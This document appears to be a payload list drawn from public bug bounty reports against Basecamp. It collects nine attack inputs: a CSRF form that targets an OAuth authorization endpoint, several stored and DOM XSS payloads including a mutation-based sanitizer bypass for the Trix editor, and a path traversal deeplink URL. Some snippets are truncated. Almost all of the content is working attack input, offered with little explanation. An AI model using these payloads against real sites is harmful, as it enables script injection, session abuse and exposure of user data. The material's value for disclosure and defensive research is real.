# Basecamp

9 payloads.

### `c93ed5ae`

```
<form action="https://target.com/authorization.json" method="POST">
      <input type="hidden" name="client&#95;id" value="{your-client-id}" />
      <input type="hidden" name="client&#95;secret" value="" />
      <input type="hidden" name="type" value="web&#95;server" />
      <input type="hidden" name="redirect&#95;uri" value="{your-redirect-uri}" />
      <input type="hidden" name="commit" value="" />
      <input type="submit" value="Submit request" />
    </form>
```

— [CSRF on target.com OAuth2 authorization endpoint](https://hackerone.com/reports/850022) · Basecamp · [carbon61](https://hackerone.com/carbon61)

### `a4ab2c4e`

```
POST /messages HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html; page-update, text/html, application/xhtml+xml
Accept-Language: ar,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://target.com/entries/[]/forwards/new
X-CSRF-Token: []
Content-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600
Origin: https://target.com
Content-Length: 1156
DNT: 1
Co
```

**Parameter:** `message[content]`
— [stored XSS in target.com message content](https://hackerone.com/reports/988272) · Basecamp · [carbon61](https://hackerone.com/carbon61)

### `ae16ce5e`

```
TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
```

**Parameter:** `subject`
— [Possible DOM XSS on target.com](https://hackerone.com/reports/1010132) · Basecamp · [enigmaticjohn](https://hackerone.com/enigmaticjohn)

### `36861219`

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://target.com/npm/trix@2.1.1/dist/trix.umd.min.js"></script>
  <link href="https://target.com/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;img 
```

— [Stored XSS on trix editor version 2.1.1](https://hackerone.com/reports/2521419) · Basecamp · [thwin_htet](https://hackerone.com/thwin_htet) · $1,000.0

### `57f0dda1`

```
https://target.com/5195267/reports/progress?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt
```

**Parameter:** `filename`
— [Path traversal in deeplink query parameter can expose any user's private info to a public directory (one click)](https://hackerone.com/reports/2553411) · Basecamp · [fr4via](https://hackerone.com/fr4via)

### `b3ef3602`

```
copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSS POC&quot;}"></div>me
```

— [Mutation Based Stored XSS on Trix Editor version latest (2.1.8)](https://hackerone.com/reports/2819573) · Basecamp · [sudi](https://hackerone.com/sudi)

### `645664e8`

```
<math><mtext><table><mglyph><style><img src=x onerror=alert()></style>
```

— [Mutation Based Stored XSS on Trix Editor version latest (2.1.8)](https://hackerone.com/reports/2819573) · Basecamp · [sudi](https://hackerone.com/sudi)

### `7875a029`

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://target.com/npm/trix@2.1.8/dist/trix.umd.js"></script>
  <link href="https://target.com/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;
```

— [Mutation Based Stored XSS on Trix Editor version latest (2.1.8)](https://hackerone.com/reports/2819573) · Basecamp · [sudi](https://hackerone.com/sudi)

### `cdfcbd49`

```
onerror="alert(1)"
```

— [Stored XSS on Trix Editor version latest (2.1.16) - Sanitizer Bypass ](https://hackerone.com/reports/3581911) · Basecamp · [newbiefromcoma](https://hackerone.com/newbiefromcoma) · $337.0
